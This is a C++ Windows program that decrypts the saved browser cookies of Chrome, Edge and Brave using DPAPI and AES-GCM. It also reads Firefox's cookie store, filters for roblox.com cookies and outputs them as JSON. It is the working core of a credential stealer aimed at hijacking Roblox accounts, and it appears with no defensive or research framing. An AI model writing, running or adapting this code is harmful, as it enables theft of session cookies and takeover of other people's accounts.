#include <windows.h>
#include <shlobj.h>
#include <fstream>
#include <string>
#include <vector>
#include <sstream>
#include <dpapi.h>
#include <wincrypt.h>
#include <sqlite3.h>
#include <filesystem>
#include <bcrypt.h>
#include <iostream>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "sqlite3.lib")
#pragma comment(lib, "bcrypt.lib")

namespace fs = std::filesystem;

struct Cookie {
    std::string host, name, value, path;
    bool secure = false, httpOnly = false;
};

static std::string JsonEscape(const std::string& s) {
    std::string o;
    for (char c : s) {
        switch (c) {
            case '"': o += "\\\""; break;
            case '\\': o += "\\\\"; break;
            case '\n': o += "\\n"; break;
            case '\r': o += "\\r"; break;
            case '\t': o += "\\t"; break;
            default:
                if ((unsigned char)c < 0x20) {
                    char buf[8];
                    sprintf_s(buf, "\\u%04x", c);
                    o += buf;
                } else o += c;
        }
    }
    return o;
}

static std::string GetLocalAppData() {
    char p[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, p)))
        return p;
    return "";
}

static std::string DPAPIDecrypt(const std::vector<BYTE>& data) {
    DATA_BLOB in{ (DWORD)data.size(), const_cast<BYTE*>(data.data()) };
    DATA_BLOB out{};
    if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
        std::string r((char*)out.pbData, out.cbData);
        LocalFree(out.pbData);
        return r;
    }
    return "";
}

static std::vector<BYTE> GetMasterKey(const std::string& localState) {
    std::ifstream f(localState);
    if (!f.is_open()) return {};
    std::stringstream ss; ss << f.rdbuf();
    std::string s = ss.str();
    size_t p = s.find("\"encrypted_key\":\"");
    if (p == std::string::npos) return {};
    p += 17;
    size_t e = s.find("\"", p);
    std::string b64 = s.substr(p, e - p);
    DWORD sz = 0;
    CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, NULL, &sz, NULL, NULL);
    std::vector<BYTE> dec(sz);
    CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, dec.data(), &sz, NULL, NULL);
    if (dec.size() <= 5) return {};
    return std::vector<BYTE>(dec.begin() + 5, dec.end());
}

static std::string AESGCMDecrypt(const std::vector<BYTE>& key, const std::vector<BYTE>& data) {
    if (data.size() < 31) return "";
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    std::string out;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)) return "";
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
        sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
        const_cast<PUCHAR>(key.data()), (ULONG)key.size(), 0)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "";
    }
    std::vector<BYTE> nonce(data.begin() + 3, data.begin() + 15);
    std::vector<BYTE> tag(data.end() - 16, data.end());
    std::vector<BYTE> ct(data.begin() + 15, data.end() - 16);
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai;
    BCRYPT_INIT_AUTH_MODE_INFO(ai);
    ai.pbNonce = nonce.data(); ai.cbNonce = (ULONG)nonce.size();
    ai.pbTag = tag.data(); ai.cbTag = (ULONG)tag.size();
    std::vector<BYTE> pt(ct.size());
    ULONG ptSz = 0;
    if (!BCryptDecrypt(hKey, ct.data(), (ULONG)ct.size(), &ai, NULL, 0,
        pt.data(), (ULONG)pt.size(), &ptSz, 0)) {
        out.assign((char*)pt.data(), ptSz);
    }
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return out;
}

static std::vector<Cookie> ExtractChromium(const std::string& userData,
    const std::string& localState, const std::string& profile) {
    std::vector<Cookie> out;
    std::string cookieDb = userData + "\\" + profile + "\\Network\\Cookies";
    if (!fs::exists(cookieDb)) return out;
    std::string temp = std::string(getenv("TEMP")) + "\\ck_" +
        std::to_string(GetTickCount()) + ".db";
    try { fs::copy_file(cookieDb, temp, fs::copy_options::overwrite_existing); }
    catch (...) { return out; }

    auto mk = GetMasterKey(localState);
    if (mk.empty()) { fs::remove(temp); return out; }
    std::string masterKey = DPAPIDecrypt(mk);
    if (masterKey.empty()) { fs::remove(temp); return out; }
    std::vector<BYTE> key(masterKey.begin(), masterKey.end());

    sqlite3* db;
    if (sqlite3_open(temp.c_str(), &db) != SQLITE_OK) { fs::remove(temp); return out; }
    sqlite3_stmt* stmt;
    const char* q = "SELECT host_key, name, encrypted_value, path, is_secure, is_httponly "
                    "FROM cookies WHERE host_key LIKE '%roblox.com%'";
    if (sqlite3_prepare_v2(db, q, -1, &stmt, NULL) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* host = (const char*)sqlite3_column_text(stmt, 0);
            const char* name = (const char*)sqlite3_column_text(stmt, 1);
            const void* blob = sqlite3_column_blob(stmt, 2);
            int bsz = sqlite3_column_bytes(stmt, 2);
            const char* path = (const char*)sqlite3_column_text(stmt, 3);
            if (!host || !name || !blob || bsz <= 0) continue;
            std::vector<BYTE> ev((const BYTE*)blob, (const BYTE*)blob + bsz);
            std::string val = AESGCMDecrypt(key, ev);
            if (val.empty()) continue;
            Cookie c;
            c.host = host; c.name = name; c.value = val;
            c.path = path ? path : "/";
            c.secure = sqlite3_column_int(stmt, 4) != 0;
            c.httpOnly = sqlite3_column_int(stmt, 5) != 0;
            out.push_back(c);
        }
        sqlite3_finalize(stmt);
    }
    sqlite3_close(db);
    fs::remove(temp);
    return out;
}

static std::vector<Cookie> ExtractFirefox() {
    std::vector<Cookie> out;
    std::string appData = getenv("APPDATA");
    std::string root = appData + "\\Mozilla\\Firefox\\Profiles";
    if (!fs::exists(root)) return out;
    for (auto& e : fs::directory_iterator(root)) {
        std::string db = e.path().string() + "\\cookies.sqlite";
        if (!fs::exists(db)) continue;
        std::string temp = std::string(getenv("TEMP")) + "\\ff_" +
            std::to_string(GetTickCount()) + ".db";
        try { fs::copy_file(db, temp, fs::copy_options::overwrite_existing); }
        catch (...) { continue; }
        sqlite3* sqldb;
        if (sqlite3_open(temp.c_str(), &sqldb) != SQLITE_OK) { fs::remove(temp); continue; }
        sqlite3_stmt* stmt;
        const char* q = "SELECT host, name, value, path, isSecure, isHttpOnly "
                        "FROM moz_cookies WHERE host LIKE '%roblox.com%'";
        if (sqlite3_prepare_v2(sqldb, q, -1, &stmt, NULL) == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                Cookie c;
                const char* h = (const char*)sqlite3_column_text(stmt, 0);
                const char* n = (const char*)sqlite3_column_text(stmt, 1);
                const char* v = (const char*)sqlite3_column_text(stmt, 2);
                const char* p = (const char*)sqlite3_column_text(stmt, 3);
                if (!h || !n || !v) continue;
                c.host = h; c.name = n; c.value = v;
                c.path = p ? p : "/";
                c.secure = sqlite3_column_int(stmt, 4) != 0;
                c.httpOnly = sqlite3_column_int(stmt, 5) != 0;
                out.push_back(c);
            }
            sqlite3_finalize(stmt);
        }
        sqlite3_close(sqldb);
        fs::remove(temp);
    }
    return out;
}

int main(int argc, char** argv) {
    std::string lad = GetLocalAppData();
    std::vector<Cookie> all;
    auto push = [&](std::vector<Cookie>&& v) {
        for (auto& c : v) all.push_back(c);
    };
    push(ExtractChromium(lad + "\\Google\\Chrome\\User Data",
        lad + "\\Google\\Chrome\\User Data\\Local State", "Default"));
    push(ExtractChromium(lad + "\\Microsoft\\Edge\\User Data",
        lad + "\\Microsoft\\Edge\\User Data\\Local State", "Default"));
    push(ExtractChromium(lad + "\\BraveSoftware\\Brave-Browser\\User Data",
        lad + "\\BraveSoftware\\Brave-Browser\\User Data\\Local State", "Default"));
    push(ExtractFirefox());

    std::ostringstream js;
    js << "{\"cookies\":[";
    for (size_t i = 0; i < all.size(); i++) {
        auto& c = all[i];
        js << "{\"host\":\"" << JsonEscape(c.host) << "\","
           << "\"name\":\"" << JsonEscape(c.name) << "\","
           << "\"value\":\"" << JsonEscape(c.value) << "\","
           << "\"path\":\"" << JsonEscape(c.path) << "\","
           << "\"secure\":" << (c.secure ? "true" : "false") << ","
           << "\"httpOnly\":" << (c.httpOnly ? "true" : "false") << "}";
        if (i + 1 < all.size()) js << ",";
    }
    js << "]}";
    std::cout << js.str();
    return 0;
}